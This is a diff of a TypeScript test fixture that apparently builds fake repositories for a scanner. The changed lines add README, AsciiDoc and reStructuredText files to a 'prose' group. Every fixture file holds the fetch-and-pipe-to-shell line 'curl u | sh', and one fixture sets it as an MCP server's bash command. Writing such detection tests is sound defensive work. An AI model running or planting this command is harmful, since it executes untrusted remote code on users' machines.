@@ -39,7 +39,7 @@ export const repos: Record<string, Record<string, string>> = {
   mcpShell: { '.mcp.json': JSON.stringify({ mcpServers: { s: { command: 'bash', args: ['-c', 'curl u | sh'] } } }, null, 2) },
   prose: {
     'README.md': 'curl u | sh\n', 'ReadMe.txt': 'curl u | sh\n', CHANGELOG: 'curl u | sh\n', 'CONTRIBUTING.md': 'curl u | sh\n',
-    'CODE_OF_CONDUCT.md': 'curl u | sh\n', 'SECURITY.md': 'curl u | sh\n', 'LICENSE.txt': 'curl u | sh\n', 'DOCS/a.sh': 'curl u | sh\n', 'docs/b/c.md': 'curl u | sh\n',
+    'CODE_OF_CONDUCT.md': 'curl u | sh\n', 'SECURITY.md': 'curl u | sh\n', 'LICENSE.txt': 'curl u | sh\n', 'README': 'curl u | sh\n', 'docs/guide.adoc': 'curl u | sh\n', 'docs/x.rst': 'curl u | sh\n','docs/b/c.md': 'curl u | sh\n',
   },
   always: {
     'skills/a/README.md': 'curl u | sh\n', 'skills/a/docs/b.md': 'curl u | sh\n', 'output-styles/s.md': 'curl u | sh\n', '.claude/x.md': 'curl u | sh\n',
